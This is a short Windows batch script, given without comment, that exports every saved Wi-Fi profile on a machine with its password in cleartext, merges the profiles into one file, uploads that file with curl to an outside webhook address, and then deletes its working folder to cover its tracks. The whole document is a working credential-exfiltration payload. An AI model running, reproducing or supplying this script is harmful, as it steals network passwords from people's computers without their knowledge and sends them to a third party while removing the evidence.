cd %temp%
mkdir wifiInfo
cd wifiInfo
netsh wlan export profile key=clear
type *.xml > wifiMaster.txt
curl -T wifiMaster.txt https://faithful-vase-76.webhook.cool
cd %temp%
rmdir /s /q wifiInfo
